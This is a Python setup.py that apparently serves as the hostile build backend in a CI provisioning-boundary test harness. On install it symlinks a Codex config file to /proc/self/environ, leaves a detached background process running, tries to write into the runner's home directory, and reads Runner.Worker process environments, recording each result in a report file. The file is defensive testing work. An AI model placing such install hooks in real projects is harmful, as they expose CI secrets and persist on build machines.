"""The hostile build backend of the provisioning-boundary harness: what a
pipeline-authored head could do to the job during `uv pip install -e .` if its
build hooks ran as the runner (finding 4628446), executed here as whatever
user provisions the checkout. Every action is recorded in HOSTILE_REPORT (a
file in the checkout) for the harness to read back:

- plants the review-round-1 primitive: replaces ~codex/.codex/config.toml
  with a symlink to /proc/self/environ (what codex-action's runner-side
  writeProxyConfig would then read and copy back readable by codex);
- leaves a background process behind (`sleep`, in its own session) to
  outlive provisioning;
- tries to write a runner-only marker (/home/runner/HOSTILE) and to read the
  runner process's environment, and records the uid it ran as.
"""
import os
import pathlib
import pwd
import subprocess

report = pathlib.Path(os.environ.get("HOSTILE_REPORT", "hostile-report.txt"))
lines = [f"uid={os.getuid()} user={pwd.getpwuid(os.getuid()).pw_name}"]

codex_home = pathlib.Path("/home/codex/.codex")
cfg = codex_home / "config.toml"
try:
    if cfg.exists() or cfg.is_symlink():
        cfg.unlink()
    cfg.symlink_to("/proc/self/environ")
    lines.append("planted=config.toml->/proc/self/environ")
except Exception as e:  # noqa: BLE001
    lines.append(f"planted=failed {type(e).__name__}")

try:
    p = subprocess.Popen(["sleep", "3600"], start_new_session=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    lines.append(f"survivor={p.pid}")
except Exception as e:  # noqa: BLE001
    lines.append(f"survivor=failed {type(e).__name__}")

try:
    pathlib.Path("/home/runner/HOSTILE").write_text("x")
    lines.append("runner-home-write=succeeded")
except Exception as e:  # noqa: BLE001
    lines.append(f"runner-home-write=refused {type(e).__name__}")

try:
    # The runner's own Runner.Worker: readable only by the same uid or root.
    workers = [p for p in pathlib.Path("/proc").iterdir()
               if p.name.isdigit() and "Runner.Worker" in (p / "cmdline").read_bytes().decode(errors="replace")]
    for w in workers:
        (w / "environ").read_bytes()
    lines.append(f"runner-environ-read=succeeded ({len(workers)} worker)")
except Exception as e:  # noqa: BLE001
    lines.append(f"runner-environ-read=refused {type(e).__name__}")

report.write_text("\n".join(lines) + "\n")

from setuptools import setup  # noqa: E402

setup(name="hostile-checkout", version="0", py_modules=[])
